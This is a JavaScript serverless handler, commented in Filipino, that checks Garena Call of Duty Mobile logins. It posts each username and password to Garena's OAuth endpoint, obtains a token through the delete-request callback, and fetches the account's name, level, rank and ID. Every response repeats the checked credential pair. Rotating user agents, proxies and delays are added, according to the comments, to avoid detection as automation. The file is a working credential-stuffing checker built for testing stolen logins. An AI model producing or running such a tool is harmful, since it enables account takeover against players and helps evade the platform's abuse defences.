import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent'; // Para sa proxy (optional pero epektibo)

// Mga setting para bawasan ang detection
const DELAY_BETWEEN_REQUESTS = 2000; // 2 segundo pagitan ng mga request
const USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
];

// Maaari kang magdagdag ng libre na proxy dito (hal., mula sa https://free-proxy-list.net/)
const PROXIES = [
    // 'http://proxy1.example.com:8080',
    // 'http://proxy2.example.com:3128'
];

// Pumili ng random na user agent o proxy
const getRandomUserAgent = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
const getRandomProxy = () => PROXIES.length > 0 ? PROXIES[Math.floor(Math.random() * PROXIES.length)] : null;

// Pahintulutan ang paghihintay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export default async function handler(req) {
    if (req.method !== 'POST') {
        return new Response(
            JSON.stringify({ status: 'error', details: 'Only POST requests allowed' }),
            { headers: { 'Content-Type': 'application/json' } }
        );
    }

    const { username, password } = await req.json();
    if (!username || !password) {
        return new Response(
            JSON.stringify({ status: 'error', details: 'Username/password missing' }),
            { headers: { 'Content-Type': 'application/json' } }
        );
    }

    try {
        // Maghintay muna bago gumawa ng request
        await delay(DELAY_BETWEEN_REQUESTS);

        // Pumili ng random na user agent at proxy
        const userAgent = getRandomUserAgent();
        const proxy = getRandomProxy();
        const agent = proxy ? new HttpsProxyAgent(proxy) : undefined;

        // Step 1: Kumuha ng access token
        const loginResponse = await fetch('https://auth.garena.com/oauth/token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': userAgent,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive'
            },
            body: new URLSearchParams({
                username,
                password,
                grant_type: 'password',
                client_id: 'garena-codm'
            }),
            agent: agent,
            timeout: 15000 // 15 segundo timeout para hindi ma-detect bilang automated
        });

        if (!loginResponse.ok) {
            return new Response(
                JSON.stringify({
                    status: 'failed',
                    details: `${username}:${password} - Error ${loginResponse.status}: Wrong credentials or account inactive`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        const loginData = await loginResponse.json();
        const accessToken = loginData.access_token;
        if (!accessToken) {
            return new Response(
                JSON.stringify({
                    status: 'failed',
                    details: `${username}:${password} - Could not get access token`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        // Maghintay ulit bago sunod na request
        await delay(DELAY_BETWEEN_REQUESTS);

        // Step 2: Kumuha ng CODM token
        const callbackResponse = await fetch(
            `https://auth.codm.garena.com/auth/auth/callback_n?site=${encodeURIComponent('https://api-delete-request.codm.garena.co.id/oauth/check_login/')}&access_token=${accessToken}`,
            {
                method: 'GET',
                headers: {
                    'Referer': 'https://auth.garena.com/',
                    'User-Agent': userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                },
                agent: agent,
                redirect: 'follow',
                timeout: 15000
            }
        );

        const cookieHeader = callbackResponse.headers.get('set-cookie') || '';
        let codmDeleteToken = null;
        if (cookieHeader) {
            const cookieParts = cookieHeader.split(';');
            codmDeleteToken = cookieParts.find(part => part.includes('codm-delete-token'))?.split('=')[1];
        }

        if (!codmDeleteToken) {
            return new Response(
                JSON.stringify({
                    status: 'error',
                    details: `${username}:${password} - Could not get CODM token`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        // Maghintay ulit
        await delay(DELAY_BETWEEN_REQUESTS);

        // Step 3: Kumuha ng detalye ng account
        const detailsResponse = await fetch('https://api-delete-request.codm.garena.co.id/oauth/check_login/', {
            method: 'GET',
            headers: {
                'codm-delete-token': codmDeleteToken,
                'Origin': 'https://delete-request.codm.garena.co.id',
                'Referer': 'https://delete-request.codm.garena.co.id/',
                'User-Agent': userAgent,
                'Accept': 'application/json, text/plain, */*'
            },
            agent: agent,
            timeout: 15000
        });

        if (!detailsResponse.ok) {
            return new Response(
                JSON.stringify({
                    status: 'error',
                    details: `${username}:${password} - Error ${detailsResponse.status}: Failed to get account details`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        const accountDetails = await detailsResponse.json();
        const displayName = accountDetails.display_name || accountDetails.username || 'Unknown';
        const level = accountDetails.level || 'Unknown';
        const userId = accountDetails.user_id || 'Unknown';
        const rank = accountDetails.rank?.name || 'Unknown';

        return new Response(
            JSON.stringify({
                status: 'success',
                details: `${username}:${password}\n✅ Display Name: ${displayName}\n📊 Level: ${level}\n🏆 Rank: ${rank}\n🆔 User ID: ${userId}`
            }),
            { headers: { 'Content-Type': 'application/json' } }
        );

    } catch (err) {
        return new Response(
            JSON.stringify({
                status: 'error',
                details: `${username}:${password} - Error: ${err.message}`
            }),
            { headers: { 'Content-Type': 'application/json' } }
        );
    }
}
